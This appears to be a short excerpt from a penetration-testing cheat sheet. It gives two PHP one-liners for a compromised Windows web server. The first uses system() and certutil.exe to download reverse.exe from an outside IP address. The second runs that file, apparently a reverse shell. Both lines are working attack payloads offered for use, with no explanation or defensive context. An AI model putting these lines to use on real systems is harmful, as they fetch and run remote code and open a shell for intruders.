#### PHP
###### PHP Upload
```c
<?php
$download = system('certutil.exe -urlcache -split -f http://192.168.45.247/reverse.exe reverse.exe', $val)
?>
```

###### PHP Run
```c
<?php
$exec = system('reverse.exe', $val)
?>
```